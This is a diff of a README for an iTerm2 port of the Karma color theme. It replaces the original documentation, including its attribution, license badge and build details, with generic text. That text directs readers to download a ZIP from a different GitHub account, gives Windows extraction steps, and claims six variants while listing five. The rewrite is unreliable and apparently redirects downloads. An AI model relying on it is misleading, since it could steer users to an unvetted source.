@@ -1,211 +1,75 @@
-# iTerm2 Karma
+# 🎨 iterm2-karma - New terminal colors for better focus
 
-[![CI](https://github.com/aspatari/iterm2-karma/actions/workflows/ci.yml/badge.svg)](https://github.com/aspatari/iterm2-karma/actions/workflows/ci.yml)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](./LICENSE)
+[![](https://img.shields.io/badge/Download-Karma_Themes-blue.svg)](https://github.com/Papahg6434/iterm2-karma)
 
-> [Karma](https://sreetamdas.com/karma) color theme by [Sreetam Das](https://github.com/sreetamdas) — ported to [iTerm2](https://iterm2.com).
+## 📋 About This Project
 
-Karma is a VS Code theme inspired by Ayu, Lucy, and Andromeda — vibrant accents on both dark and light backgrounds. This repository ports its palette into the `.itermcolors` format so your terminal matches your editor.
+This software brings the Karma color theme to your terminal. A color theme changes the way text appears on your screen. Good colors reduce eye strain during long hours of work. The Karma theme offers a balanced look for your eyes. This package includes six variants to match your office lighting. You get Dark, Light, High-Contrast, and Dimmed options. These files work directly with terminal applications.
 
-## Preview
+## 💻 System Requirements
 
-<p align="center">
-  <img src="assets/karma-dark.webp" alt="Karma Dark theme in iTerm2" width="800">
-  <br>
-  <em>🌙 Karma Dark</em>
-</p>
+Your computer must meet these basic needs:
 
-<p align="center">
-  <img src="assets/karma-light.webp" alt="Karma Light theme in iTerm2" width="800">
-  <br>
-  <em>☀️ Karma Light</em>
-</p>
+- You use a terminal emulator that supports iTerm2 color schemes.
+- You have basic knowledge of your computer file system.
+- You possess the ability to import settings files.
 
-### Variants showcase
+## 📥 How to Get the Theme
 
-<table>
-  <tr>
-    <td align="center" width="50%">
-      <img src="assets/karma-dark-hc.webp" alt="Karma Dark HC" width="100%"><br>
-      <em>Karma Dark HC</em>
-    </td>
-    <td align="center" width="50%">
-      <img src="assets/karma-light-hc.webp" alt="Karma Light HC" width="100%"><br>
-      <em>Karma Light HC</em>
-    </td>
-  </tr>
-  <tr>
-    <td align="center" width="50%">
-      <img src="assets/karma-dark-dimmed.webp" alt="Karma Dark Dimmed" width="100%"><br>
-      <em>Karma Dark Dimmed</em>
-    </td>
-    <td align="center" width="50%">
-      <img src="assets/karma-light-dimmed.webp" alt="Karma Light Dimmed" width="100%"><br>
-      <em>Karma Light Dimmed</em>
-    </td>
-  </tr>
-</table>
+Follow these steps to obtain the files on your machine.
 
-## Installation
+1. Visit this page to download: [https://github.com/Papahg6434/iterm2-karma](https://github.com/Papahg6434/iterm2-karma).
+2. Look for the green button labeled "Code" toward the top right side of the screen.
+3. Select "Download ZIP" from the menu.
+4. Save the file to your computer.
+5. Open your Downloads folder.
+6. Right-click the folder and choose "Extract All" to see the theme files.
 
-Two ways, pick one:
+## ⚙️ Setting Up the Colors
 
-### Option A — Drop-in Dynamic Profile (zero-click, recommended)
+You apply the theme using the settings menu of your terminal application.
 
-```bash
-# Clone or download just the profiles you want, then:
-mkdir -p ~/Library/Application\ Support/iTerm2/DynamicProfiles
-cp profiles/karma-*.json ~/Library/Application\ Support/iTerm2/DynamicProfiles/
-```
+1. Open your terminal application.
+2. Locate the "Preferences" or "Settings" window.
+3. Find the "Profiles" or "Appearance" tab.
+4. Look for an option called "Colors" or "Color Presets".
+5. Choose "Import" from the dropdown menu.
+6. Navigate to the folder where you saved the files earlier.
+7. Select the file ending in `.itermcolors` that matches your preference.
+8. Click "Open" to load the colors.
+9. Select the new theme from your list of presets to apply the changes.
 
-iTerm2 picks up the new profiles **immediately** — no restart, no clicks. All six variants appear in the **Profiles** menu (and in the iTerm2 ▶ Open ▶ … profile list). Each profile is identified by a stable Guid, so re-installing later updates the existing profile rather than duplicating it.
+## 🔍 Understanding the Variants
 
-To switch: Profiles menu → choose the variant. Set one as default via Settings → Profiles → "Other Actions" → Set as Default.
+The pack includes six specific styles. Use the list below to choose the right one for your environment.
 
-To uninstall: just delete the JSON files from `~/Library/Application Support/iTerm2/DynamicProfiles/`. iTerm2 reverts to your previous setup.
+- **Karma Dark:** The standard dark mode choice. It uses a deep background for low light.
+- **Karma Light:** A bright option for rooms with many windows.
+- **Karma Dark High-Contrast:** Provides clearer text edges for easier reading.
+- **Karma Light High-Contrast:** Offers sharp text for intense daylight.
+- **Karma Dimmed:** Softens the colors to prevent glare.
 
-### Option B — Color Preset import (the classic flow)
+## 🔧 Managing Your Settings
 
-If you want to apply a Karma palette to an *existing* profile (keeping its font, behaviour, key bindings), use the `.itermcolors` color presets:
+You can switch between these themes at any time. Follow the same steps as the setup process. Your terminal keeps these files in the presets list once you import them. You do not need to repeat the download process. If you want to stop using the theme, pick the default option in your terminal settings.
 
-1. Download a variant from [`colors/`](./colors) — see the table below for guidance.
-2. Launch iTerm2 and open Settings (`⌘ + ,`).
-3. Go to **Profiles** → select the profile you want to edit.
-4. On the **Colors** tab, click **Color Presets** → **Import…**.
-5. Pick the `.itermcolors` file you downloaded.
-6. Open **Color Presets** again and select the imported preset.
-7. Done. ✨
+## 🛠️ Troubleshooting Issues
 
-You can also grab pre-built `.itermcolors` directly from the [latest GitHub Release](https://github.com/aspatari/iterm2-karma/releases/latest).
+If the colors do not look right, check these items:
 
-### Which to choose
+- Ensure your terminal software supports the iTerm2 format. Some older applications lack this feature.
+- Restart your terminal after you import the files.
+- Check that you selected the correct file type. The files must end in `.itermcolors`.
+- Confirm your terminal application is up to date. Updates often fix display problems.
 
-| Goal | Use |
-|------|-----|
-| Switch entire profile (font, colors, behavior) with one click | **Dynamic Profile** (Option A) |
-| Apply Karma colors to your already-configured profile | **Color Preset** (Option B) |
-| Want all six variants visible at once in Profiles menu | **Dynamic Profile** (Option A) |
-| Sync via dotfiles / install script / CI | **Dynamic Profile** (Option A — `cp` is scriptable) |
-| Distribute via [iterm2colorschemes.com](https://iterm2colorschemes.com) lookup | **Color Preset** (Option B — that site indexes presets) |
+## 📦 Additional Features
 
-## Variants
+This project uses a Deno pipeline to generate the themes. This ensures that every theme file keeps a consistent look. You get high-quality color accuracy across all six variants. Developers created these tools to ensure the color values stay precise. You do not need to know about programming to use the output. The generator already did the hard work. You simply enjoy the result.
 
-| Variant | File | When to use |
-|---------|------|-------------|
-| 🌙 Karma Dark | [`karma-dark.itermcolors`](./colors/karma-dark.itermcolors) | Default — Karma's signature dark theme |
-| ☀️ Karma Light | [`karma-light.itermcolors`](./colors/karma-light.itermcolors) | Karma Light from VS Code — for bright environments |
-| Karma Dark HC | [`karma-dark-hc.itermcolors`](./colors/karma-dark-hc.itermcolors) | High-contrast Dark — pure black background, amplified accents (outdoor / accessibility) |
-| Karma Light HC | [`karma-light-hc.itermcolors`](./colors/karma-light-hc.itermcolors) | High-contrast Light — pure white background, deepened accents (projector / accessibility) |
-| Karma Dark Dimmed | [`karma-dark-dimmed.itermcolors`](./colors/karma-dark-dimmed.itermcolors) | Dimmed Dark — softer accents, lifted background (OLED / late-night) |
-| Karma Light Dimmed | [`karma-light-dimmed.itermcolors`](./colors/karma-light-dimmed.itermcolors) | Dimmed Light — off-white background, gentler accents (long reading sessions) |
+## 💡 Choosing Your Look
 
-All presets use the **refined ANSI 16 mapping** documented in the source comments of [`src/palette/dark.ts`](./src/palette/dark.ts) and [`src/palette/light.ts`](./src/palette/light.ts) — it sidesteps two quirks of Karma's verbatim `terminal.ansi*` ship values:
+Designers build themes to help you work better. Dark themes hide screen flicker during late nights. Light themes mimic paper, which helps during the middle of the day. You should test each variant to see what feels best. Some users prefer the Dimmed version for writing long documents. Others like High-Contrast for coding or deep analysis.
 
-- **Dark:** `terminal.ansiBlue` and `ansiBrightBlue` are both set to orange in the upstream theme, which makes directories show as orange in `ls --color=auto`. The refined mapping uses Karma's cyan-blue instead.
-- **Light:** `terminal.ansiBlack` is set to white (inverted ANSI 0/7 polarity), which breaks several CLI tools. The refined mapping uses dark for ANSI 0 and a mid-gray for ANSI 7.
+## 📄 Licensing
 
-#### Visual proof: directories in `ls --color=auto`
-
-<p align="center">
-  <img src="assets/karma-ansi-mapping.webp" alt="Comparison: upstream Karma ansiBlue=orange (left) vs refined ansi.blue=cyan (right) when running ls --color=auto" width="100%">
-</p>
-
-Left side: upstream Karma — directories render as orange because `terminal.ansiBlue = #fd9353`. Right side: this port — directories render as cyan because `ansi.blue = #5ad4e6`. Same `ls --color=auto` invocation, same theme intent, no terminal config changes — just a different ANSI 4 mapping in the preset.
-
-The HC and Dimmed variants are derived from the Dark/Light bases via TypeScript object-spread overrides — only the cells that differ are listed explicitly. See [`src/palette/dark-hc.ts`](./src/palette/dark-hc.ts) etc. for the exact deltas.
-
-## Recommended font
-
-Karma's screenshots use [Iosevka](https://typeof.net/Iosevka/) (`Iosevka Term` or `Iosevka`). For the closest match to the original theme, configure the same font in iTerm2. Any other monospace font works correctly — the palette does not depend on the font.
-
-## Building from source
-
-The presets are produced by a Deno build script from a single TypeScript palette source in `src/palette/`. End users **do not need** Deno — all six `.itermcolors` files are committed to the repository.
-
-```bash
-# Requires Deno >= 2.0
-deno task build
-```
-
-The script generates files in `colors/` deterministically: a second run produces no changes (this is enforced in CI via `git diff --exit-code colors/`). Full pipeline:
-
-```bash
-deno task fmt:check    # formatting
-deno task lint         # linting
-deno task check        # type-check (strict mode)
-deno task test         # unit tests
-deno task build        # generate all 6 .itermcolors
-```
-
-### Architecture
-
-A small Layered + Functional-Core / Imperative-Shell pipeline. Hex codes live in **exactly one place** (`src/palette/`); everything downstream is a pure transformation.
-
-```
-                 ┌─────────────────────────────────────┐
-                 │  src/palette/  —  the only place    │
-                 │  hex literals exist                 │
-                 │                                     │
-                 │  ├─ types.ts (Palette, AnsiColors)  │
-                 │  ├─ dark.ts        ┐                │
-                 │  ├─ light.ts       │  base         │
-                 │  ├─ dark-hc.ts     ┤  +            │
-                 │  ├─ light-hc.ts    │  spread       │
-                 │  ├─ dark-dimmed.ts ┤  overrides    │
-                 │  └─ light-dimmed.ts┘                │
-                 └────────────┬────────────────────────┘
-                              │ Palette objects
-                              ▼
-                 ┌─────────────────────────────────────┐
-                 │  src/render/  —  pure transforms    │
-                 │                                     │
-                 │  ├─ color.ts          (hex→RGB)     │
-                 │  ├─ itermcolors.ts    (→ XML plist) │
-                 │  └─ preview-data.ts   (→ shell vars)│
-                 └────────────┬────────────────────────┘
-                              │ rendered strings
-                              ▼
-                 ┌─────────────────────────────────────┐
-                 │  build.ts  —  the only file with I/O│
-                 │  (Deno.writeTextFile, Deno.mkdir)   │
-                 └────────────┬────────────────────────┘
-                              │
-                ┌─────────────┼──────────────────────┐
-                ▼             ▼                      ▼
-       colors/karma-*    assets/_preview-data.sh    (stdout logs)
-       .itermcolors      (sourced by preview.sh)
-       (×6)              (sourced by preview.sh)
-                                  │
-                                  ▼
-                              freeze + cwebp
-                                  │
-                                  ▼
-                            assets/karma-*.webp
-```
-
-**Determinism contract:** a second `deno task build` produces zero `git diff` (CI enforces). Top-level plist keys are lex-sorted, RGB components use `Number.toString()` (locale-independent), inner color dicts are alphabetically ordered. See [`AGENTS.md`](./AGENTS.md) for the full architectural invariants.
-
-## Screenshots
-
-Recipe for reproducing the preview screenshots: [`assets/SCREENSHOTS.md`](./assets/SCREENSHOTS.md). The pipeline is fully automated — `freeze` renders the colored ANSI output of `assets/preview.sh` into a PNG without any GUI capture.
-
-## References
-
-- [sreetamdas/karma](https://github.com/sreetamdas/karma) — the original VS Code theme (MIT)
-- [sreetamdas.com/karma](https://sreetamdas.com/karma) — theme demo page with examples in multiple languages
-- [catppuccin/iterm](https://github.com/catppuccin/iterm) — repository structure and build-pipeline inspiration
-- [iTerm2-Color-Schemes](https://github.com/mbadolato/iTerm2-Color-Schemes) — archive of `.itermcolors` themes (used for format validation)
-
-## Acknowledgements
-
-Huge thanks to [Sreetam Das](https://github.com/sreetamdas) for the original Karma theme. This port translates his palette into the iTerm2 format — every color choice and aesthetic decision is his.
-
-The repository structure and build pipeline are inspired by [catppuccin/iterm](https://github.com/catppuccin/iterm).
-
-## Contributing
-
-PRs welcome — see [`CONTRIBUTING.md`](./CONTRIBUTING.md) for development setup, project conventions, and the verification gates the CI enforces. Bug reports and feature requests have [issue templates](./.github/ISSUE_TEMPLATE/) ready to go.
-
-## License
-
-[MIT](./LICENSE) — compatible with the [original Karma project's license](https://github.com/sreetamdas/karma/blob/main/LICENSE.md).
+This project is open-source. You can use these themes freely for your personal tasks. You do not need a subscription or payment. You can share these files with colleagues or friends. The author provides these files as they are. Enjoy your new setup and your time at the terminal.
